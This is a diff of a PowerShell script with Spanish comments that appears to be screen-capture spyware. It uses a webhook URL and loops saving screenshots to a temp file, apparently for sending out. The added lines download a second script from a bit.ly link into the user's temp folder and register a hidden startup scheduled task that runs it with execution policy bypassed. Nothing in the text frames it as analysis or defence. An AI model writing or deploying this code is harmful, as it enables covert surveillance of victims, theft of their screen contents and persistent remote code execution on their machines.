@@ -4,21 +4,21 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detected..."
+    Write-Host "Shortened Webhook URL Detectedooo..."
     $hookurl = (irm $hookurl).url
 }
 
-# Eliminar la tarea programada anterior si existe
-$existingTask = Get-ScheduledTask -TaskName "ScriptStartupTask" -ErrorAction SilentlyContinue
-if ($existingTask) {
-    Unregister-ScheduledTask -TaskName "ScriptStartupTask" -Confirm:$false
-}
+# Ruta de la carpeta temporal del usuario
+$tempFolderPath = [System.IO.Path]::GetTempPath()
+$scriptPath = Join-Path -Path $tempFolderPath -ChildPath "sysw.ps1"
 
-# Crear la tarea programada para iniciar el script al iniciar Windows
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""
+# Descargar el script en la carpeta temporal del usuario
+Invoke-WebRequest -Uri "http://bit.ly/screen_dc" -OutFile $scriptPath
+
+# Crear la tarea programada en el Registro de tareas de usuario
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName "ScriptStartupTask" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest
+Register-ScheduledTask -TaskName "ScriptStartupTask" -Action $action -Trigger $trigger -User $env:USERNAME -RunLevel LimitedAccess
 
 do {
     $Filett = "$env:temp\SC.png"
